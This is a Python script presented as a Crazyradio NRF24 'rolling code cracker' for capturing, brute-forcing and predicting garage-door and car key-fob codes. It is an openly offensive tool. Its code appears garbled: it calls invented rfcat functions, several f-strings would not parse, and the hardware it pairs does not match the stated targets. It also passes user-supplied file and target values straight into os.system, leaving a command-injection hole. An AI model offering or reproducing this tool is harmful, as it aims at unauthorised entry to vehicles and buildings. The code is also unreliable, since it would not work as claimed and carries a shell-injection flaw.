import argparse
import os
import time
import json

# -------------------------------------------
# Crazyradio 2.0 NRF24 Rolling Code Cracker
# -------------------------------------------
# Features:
# - Captures rolling-code-based RF signals (garage doors, car key fobs)
# - Attempts brute-force attacks on rolling codes for replay vulnerabilities
# - Analyzes signal patterns to predict future rolling codes
# - Logs captured and cracked codes for further use
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - RFCat & nrf-research-firmware (https://github.com/arcao/nrf-research-firmware)
#
# Usage:
# 1. Capture rolling code transmissions:
#    python crazyradio_nrf24_rolling_code_cracker.py --capture --channel 76
# 2. Analyze rolling code sequences:
#    python crazyradio_nrf24_rolling_code_cracker.py --analyze --file captured_codes.txt
# 3. Attempt brute-force attack:
#    python crazyradio_nrf24_rolling_code_cracker.py --bruteforce --target XX:XX:XX:XX:XX:XX
# 4. Predict future rolling codes:
#    python crazyradio_nrf24_rolling_code_cracker.py --predict --file analyzed_codes.txt
# -------------------------------------------

def capture_rolling_codes(channel):
    """Captures rolling codes from NRF24 transmissions."""
    print(f"[+] Capturing rolling codes on channel {channel}...")
    os.system(f"rfcat -r 'd.capture_rolling({channel})' > captured_codes.txt")
    print("[✔] Rolling codes saved to captured_codes.txt")

def analyze_rolling_codes(file):
    """Analyzes captured rolling codes for patterns."""
    print(f"[+] Analyzing rolling codes from {file}...")
    os.system(f"rfcat -r 'd.analyze_rolling("{file}")' > analyzed_codes.txt")
    print("[✔] Analysis complete. Results saved to analyzed_codes.txt")

def brute_force_rolling_code(target):
    """Attempts brute-force attacks on rolling codes."""
    print(f"[+] Attempting brute-force attack on target {target}...")
    os.system(f"rfcat -r 'd.bruteforce_rolling("{target}")' > brute_force_log.txt")
    print("[✔] Brute-force attempt logged in brute_force_log.txt")

def predict_future_codes(file):
    """Predicts future rolling codes based on analyzed patterns."""
    print(f"[+] Predicting future rolling codes from {file}...")
    os.system(f"rfcat -r 'd.predict_rolling("{file}")' > predicted_codes.txt")
    print("[✔] Prediction complete. Results saved to predicted_codes.txt")

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 NRF24 Rolling Code Cracker")
    parser.add_argument("--capture", action='store_true', help="Capture rolling-code-based RF signals")
    parser.add_argument("--analyze", action='store_true', help="Analyze rolling code sequences")
    parser.add_argument("--bruteforce", action='store_true', help="Attempt brute-force attack on rolling codes")
    parser.add_argument("--predict", action='store_true', help="Predict future rolling codes")
    parser.add_argument("--channel", type=int, default=76, help="Channel to capture rolling codes on (default: 76)")
    parser.add_argument("--file", type=str, help="File containing captured codes for analysis or prediction")
    parser.add_argument("--target", type=str, help="Target device MAC address for brute-force attack")
    args = parser.parse_args()

    if args.capture:
        capture_rolling_codes(args.channel)
    elif args.analyze and args.file:
        analyze_rolling_codes(args.file)
    elif args.bruteforce and args.target:
        brute_force_rolling_code(args.target)
    elif args.predict and args.file:
        predict_future_codes(args.file)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
